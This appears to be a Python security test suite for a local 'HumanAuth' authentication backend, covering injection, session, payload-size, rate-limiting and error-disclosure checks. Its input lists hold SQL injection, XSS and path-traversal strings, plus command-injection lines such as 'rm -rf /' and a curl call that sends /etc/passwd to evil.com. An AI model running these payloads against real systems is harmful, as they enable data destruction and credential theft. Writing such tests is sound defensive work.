#!/usr/bin/env python3
"""
Security testing for HumanAuth system.
Tests for common security vulnerabilities and attack vectors.
"""

import unittest
import requests
import json
import base64
import time
import sys
import os
from urllib.parse import quote
import hashlib
import random
import string

class TestInputValidation(unittest.TestCase):
    """Test input validation and sanitization"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.backend_url = "http://localhost:8000"
        
        # Check if backend is running
        try:
            response = requests.get(f"{self.backend_url}/health", timeout=5)
            if response.status_code != 200:
                self.skipTest("Backend service not running")
        except requests.exceptions.RequestException:
            self.skipTest("Backend service not accessible")
    
    def test_sql_injection_attempts(self):
        """Test for SQL injection vulnerabilities"""
        sql_payloads = [
            "'; DROP TABLE sessions; --",
            "' OR '1'='1",
            "'; SELECT * FROM users; --",
            "' UNION SELECT * FROM sessions --",
            "admin'--",
            "' OR 1=1 --"
        ]
        
        # Test session creation with malicious session IDs
        for payload in sql_payloads:
            # Try to access session with malicious ID
            response = requests.post(f"{self.backend_url}/sessions/{quote(payload)}/reset")
            
            # Should return 404 (not found) or 400 (bad request), not 500 (server error)
            self.assertIn(response.status_code, [400, 404], 
                         f"SQL injection payload may have caused server error: {payload}")
    
    def test_xss_attempts(self):
        """Test for Cross-Site Scripting vulnerabilities"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
            "<svg onload=alert('XSS')>",
            "<%2Fscript%3E%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"
        ]
        
        # Create a session first
        response = requests.post(f"{self.backend_url}/sessions")
        if response.status_code != 200:
            self.skipTest("Cannot create session for XSS testing")
        
        session_id = response.json()['data']['session_id']
        
        # Test XSS in frame data
        for payload in xss_payloads:
            frame_data = {
                'frame': base64.b64encode(payload.encode()).decode('utf-8')
            }
            
            response = requests.post(
                f"{self.backend_url}/sessions/{session_id}/process",
                json=frame_data
            )
            
            # Should handle malicious input gracefully
            self.assertIn(response.status_code, [200, 400], 
                         f"XSS payload may have caused unexpected response: {payload}")
            
            if response.status_code == 200:
                # Response should not contain unescaped payload
                response_text = response.text.lower()
                self.assertNotIn('<script>', response_text, 
                               f"XSS payload not properly sanitized: {payload}")
    
    def test_command_injection_attempts(self):
        """Test for command injection vulnerabilities"""
        command_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& whoami",
            "; rm -rf /",
            "$(cat /etc/passwd)",
            "`whoami`",
            "; curl http://evil.com/steal?data=$(cat /etc/passwd)"
        ]
        
        # Test in various input fields
        for payload in command_payloads:
            # Test in verify endpoint
            verify_data = {
                'image': base64.b64encode(payload.encode()).decode('utf-8')
            }
            
            response = requests.post(f"{self.backend_url}/verify", json=verify_data)
            
            # Should handle malicious input without executing commands
            self.assertIn(response.status_code, [200, 400], 
                         f"Command injection payload caused unexpected response: {payload}")
    
    def test_path_traversal_attempts(self):
        """Test for path traversal vulnerabilities"""
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]
        
        # Test path traversal in session IDs
        for payload in path_payloads:
            response = requests.post(f"{self.backend_url}/sessions/{quote(payload)}/reset")
            
            # Should return 404 or 400, not expose file system
            self.assertIn(response.status_code, [400, 404], 
                         f"Path traversal payload may have succeeded: {payload}")

class TestAuthenticationSecurity(unittest.TestCase):
    """Test authentication and authorization security"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.backend_url = "http://localhost:8000"
        
        # Check if backend is running
        try:
            response = requests.get(f"{self.backend_url}/health", timeout=5)
            if response.status_code != 200:
                self.skipTest("Backend service not running")
        except requests.exceptions.RequestException:
            self.skipTest("Backend service not accessible")
    
    def test_session_hijacking_protection(self):
        """Test protection against session hijacking"""
        # Create two sessions
        response1 = requests.post(f"{self.backend_url}/sessions")
        response2 = requests.post(f"{self.backend_url}/sessions")
        
        if response1.status_code != 200 or response2.status_code != 200:
            self.skipTest("Cannot create sessions for hijacking test")
        
        session_id1 = response1.json()['data']['session_id']
        session_id2 = response2.json()['data']['session_id']
        
        # Verify sessions are different
        self.assertNotEqual(session_id1, session_id2, "Session IDs should be unique")
        
        # Verify session IDs are sufficiently random/long
        self.assertGreater(len(session_id1), 10, "Session ID should be sufficiently long")
        self.assertGreater(len(session_id2), 10, "Session ID should be sufficiently long")
        
        # Test that sessions are isolated
        frame_data = {'frame': base64.b64encode(b'test_data').decode('utf-8')}
        
        # Process frame in session 1
        response = requests.post(f"{self.backend_url}/sessions/{session_id1}/process", json=frame_data)
        self.assertEqual(response.status_code, 200)
        
        # Try to access session 1 data from session 2 (should fail)
        # This is more of a logical test - sessions should be independent
        response = requests.post(f"{self.backend_url}/sessions/{session_id2}/process", json=frame_data)
        self.assertEqual(response.status_code, 200)  # Should work but be independent
    
    def test_session_id_predictability(self):
        """Test that session IDs are not predictable"""
        session_ids = []
        
        # Create multiple sessions
        for _ in range(10):
            response = requests.post(f"{self.backend_url}/sessions")
            if response.status_code == 200:
                session_id = response.json()['data']['session_id']
                session_ids.append(session_id)
        
        # Verify we got some sessions
        self.assertGreater(len(session_ids), 5, "Should be able to create multiple sessions")
        
        # Verify all session IDs are unique
        self.assertEqual(len(session_ids), len(set(session_ids)), "All session IDs should be unique")
        
        # Verify session IDs don't follow predictable patterns
        # Check for sequential patterns
        for i in range(len(session_ids) - 1):
            # Session IDs should not be sequential
            self.assertNotEqual(session_ids[i], session_ids[i + 1], "Session IDs should not be sequential")
    
    def test_unauthorized_access_attempts(self):
        """Test unauthorized access to protected endpoints"""
        # Test access with invalid session IDs
        invalid_session_ids = [
            "invalid",
            "123456",
            "",
            "null",
            "undefined",
            "admin",
            "test"
        ]
        
        frame_data = {'frame': base64.b64encode(b'test').decode('utf-8')}
        
        for invalid_id in invalid_session_ids:
            response = requests.post(
                f"{self.backend_url}/sessions/{invalid_id}/process",
                json=frame_data
            )
            
            # Should return 404 (not found) for invalid sessions
            self.assertEqual(response.status_code, 404, 
                           f"Invalid session ID should return 404: {invalid_id}")

class TestDataValidation(unittest.TestCase):
    """Test data validation and sanitization"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.backend_url = "http://localhost:8000"
        
        # Check if backend is running
        try:
            response = requests.get(f"{self.backend_url}/health", timeout=5)
            if response.status_code != 200:
                self.skipTest("Backend service not running")
        except requests.exceptions.RequestException:
            self.skipTest("Backend service not accessible")
    
    def test_malformed_json_handling(self):
        """Test handling of malformed JSON data"""
        # Create a session
        response = requests.post(f"{self.backend_url}/sessions")
        if response.status_code != 200:
            self.skipTest("Cannot create session for JSON testing")
        
        session_id = response.json()['data']['session_id']
        
        malformed_json_payloads = [
            '{"frame": "test"',  # Missing closing brace
            '{"frame": }',       # Missing value
            '{"frame": "test",}', # Trailing comma
            '{frame: "test"}',   # Unquoted key
            '{"frame": "test" "extra": "data"}', # Missing comma
            'not json at all',   # Not JSON
            '{"frame": null}',   # Null value
            '{}',               # Empty object
        ]
        
        for payload in malformed_json_payloads:
            response = requests.post(
                f"{self.backend_url}/sessions/{session_id}/process",
                data=payload,
                headers={'Content-Type': 'application/json'}
            )
            
            # Should return 400 (bad request) for malformed JSON
            self.assertEqual(response.status_code, 400, 
                           f"Malformed JSON should return 400: {payload}")
    
    def test_oversized_payload_handling(self):
        """Test handling of oversized payloads"""
        # Create a session
        response = requests.post(f"{self.backend_url}/sessions")
        if response.status_code != 200:
            self.skipTest("Cannot create session for payload testing")
        
        session_id = response.json()['data']['session_id']
        
        # Create oversized payload (10MB base64 data)
        large_data = 'A' * (10 * 1024 * 1024)
        oversized_payload = {
            'frame': base64.b64encode(large_data.encode()).decode('utf-8')
        }
        
        response = requests.post(
            f"{self.backend_url}/sessions/{session_id}/process",
            json=oversized_payload,
            timeout=30  # Longer timeout for large payload
        )
        
        # Should handle large payloads gracefully (either process or reject)
        self.assertIn(response.status_code, [200, 400, 413, 500], 
                     "Oversized payload should be handled gracefully")
        
        # If rejected, should be with appropriate status code
        if response.status_code == 413:
            print("✅ Server properly rejects oversized payloads with 413")
        elif response.status_code == 400:
            print("✅ Server rejects oversized payloads with 400")
        elif response.status_code == 200:
            print("⚠️  Server accepts large payloads - ensure this is intended")
    
    def test_invalid_base64_handling(self):
        """Test handling of invalid base64 data"""
        # Create a session
        response = requests.post(f"{self.backend_url}/sessions")
        if response.status_code != 200:
            self.skipTest("Cannot create session for base64 testing")
        
        session_id = response.json()['data']['session_id']
        
        invalid_base64_payloads = [
            "not_base64_at_all",
            "invalid!@#$%^&*()",
            "SGVsbG8gV29ybGQ",  # Valid base64 but not image data
            "",                 # Empty string
            "A",                # Too short
            "AAAA====",         # Invalid padding
        ]
        
        for payload in invalid_base64_payloads:
            frame_data = {'frame': payload}
            response = requests.post(
                f"{self.backend_url}/sessions/{session_id}/process",
                json=frame_data
            )
            
            # Should handle invalid base64 gracefully
            self.assertIn(response.status_code, [200, 400], 
                         f"Invalid base64 should be handled gracefully: {payload}")

class TestDenialOfService(unittest.TestCase):
    """Test protection against denial of service attacks"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.backend_url = "http://localhost:8000"
        
        # Check if backend is running
        try:
            response = requests.get(f"{self.backend_url}/health", timeout=5)
            if response.status_code != 200:
                self.skipTest("Backend service not running")
        except requests.exceptions.RequestException:
            self.skipTest("Backend service not accessible")
    
    def test_rapid_request_handling(self):
        """Test handling of rapid successive requests"""
        # Create a session
        response = requests.post(f"{self.backend_url}/sessions")
        if response.status_code != 200:
            self.skipTest("Cannot create session for DoS testing")
        
        session_id = response.json()['data']['session_id']
        frame_data = {'frame': base64.b64encode(b'test').decode('utf-8')}
        
        # Send rapid requests
        rapid_request_count = 50
        success_count = 0
        rate_limited_count = 0
        
        start_time = time.time()
        
        for _ in range(rapid_request_count):
            response = requests.post(
                f"{self.backend_url}/sessions/{session_id}/process",
                json=frame_data,
                timeout=5
            )
            
            if response.status_code == 200:
                success_count += 1
            elif response.status_code == 429:  # Too Many Requests
                rate_limited_count += 1
        
        end_time = time.time()
        total_time = end_time - start_time
        
        print(f"\nRapid Request Test Results:")
        print(f"  Requests sent: {rapid_request_count}")
        print(f"  Successful: {success_count}")
        print(f"  Rate limited: {rate_limited_count}")
        print(f"  Total time: {total_time:.2f}s")
        print(f"  Requests per second: {rapid_request_count / total_time:.2f}")
        
        # System should either handle all requests or implement rate limiting
        total_handled = success_count + rate_limited_count
        self.assertGreater(total_handled / rapid_request_count, 0.8, 
                          "System should handle or rate-limit most requests")
    
    def test_session_exhaustion_protection(self):
        """Test protection against session exhaustion attacks"""
        max_sessions_to_create = 100
        created_sessions = 0
        
        start_time = time.time()
        
        for _ in range(max_sessions_to_create):
            response = requests.post(f"{self.backend_url}/sessions", timeout=5)
            
            if response.status_code == 200:
                created_sessions += 1
            elif response.status_code == 429:  # Rate limited
                print(f"✅ Rate limiting activated after {created_sessions} sessions")
                break
            elif response.status_code == 503:  # Service unavailable
                print(f"✅ Service protection activated after {created_sessions} sessions")
                break
            
            # Stop if taking too long
            if time.time() - start_time > 30:
                break
        
        end_time = time.time()
        total_time = end_time - start_time
        
        print(f"\nSession Exhaustion Test Results:")
        print(f"  Sessions created: {created_sessions}")
        print(f"  Total time: {total_time:.2f}s")
        
        # System should either limit session creation or handle many sessions
        if created_sessions < max_sessions_to_create:
            print("✅ System implements session creation limits")
        else:
            print("⚠️  System allows unlimited session creation - ensure this is intended")
        
        # Verify system is still responsive
        health_response = requests.get(f"{self.backend_url}/health")
        self.assertEqual(health_response.status_code, 200, 
                        "System should remain responsive after session exhaustion test")

class TestInformationDisclosure(unittest.TestCase):
    """Test for information disclosure vulnerabilities"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.backend_url = "http://localhost:8000"
        
        # Check if backend is running
        try:
            response = requests.get(f"{self.backend_url}/health", timeout=5)
            if response.status_code != 200:
                self.skipTest("Backend service not running")
        except requests.exceptions.RequestException:
            self.skipTest("Backend service not accessible")
    
    def test_error_message_disclosure(self):
        """Test that error messages don't disclose sensitive information"""
        # Test various error conditions
        error_test_cases = [
            ("Invalid session", f"{self.backend_url}/sessions/invalid/process"),
            ("Malformed JSON", f"{self.backend_url}/sessions/test/process"),
            ("Non-existent endpoint", f"{self.backend_url}/nonexistent"),
        ]
        
        for test_name, url in error_test_cases:
            response = requests.post(url, json={'invalid': 'data'})
            
            if response.status_code >= 400:
                response_text = response.text.lower()
                
                # Check for sensitive information in error messages
                sensitive_patterns = [
                    'traceback',
                    'stack trace',
                    'file path',
                    '/users/',
                    '/home/',
                    'c:\\',
                    'password',
                    'secret',
                    'key',
                    'token',
                    'internal server error',
                    'database',
                    'sql'
                ]
                
                for pattern in sensitive_patterns:
                    self.assertNotIn(pattern, response_text, 
                                   f"Error message may disclose sensitive info ({pattern}) in {test_name}")
    
    def test_http_headers_security(self):
        """Test HTTP security headers"""
        response = requests.get(f"{self.backend_url}/health")
        headers = response.headers
        
        # Check for security headers
        security_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
            'X-XSS-Protection': '1; mode=block',
        }
        
        for header, expected_values in security_headers.items():
            if header in headers:
                if isinstance(expected_values, list):
                    self.assertIn(headers[header], expected_values, 
                                f"Security header {header} has unexpected value")
                else:
                    self.assertEqual(headers[header], expected_values, 
                                   f"Security header {header} has unexpected value")
                print(f"✅ Security header {header}: {headers[header]}")
            else:
                print(f"⚠️  Missing security header: {header}")

def run_security_tests():
    """Run all security tests and return results"""
    print("🧪 Running Security Vulnerability Tests...")
    print("=" * 60)
    
    # Create test suite
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add test cases
    suite.addTests(loader.loadTestsFromTestCase(TestInputValidation))
    suite.addTests(loader.loadTestsFromTestCase(TestAuthenticationSecurity))
    suite.addTests(loader.loadTestsFromTestCase(TestDataValidation))
    suite.addTests(loader.loadTestsFromTestCase(TestDenialOfService))
    suite.addTests(loader.loadTestsFromTestCase(TestInformationDisclosure))
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # Return success status
    return result.wasSuccessful()

if __name__ == "__main__":
    success = run_security_tests()
    sys.exit(0 if success else 1)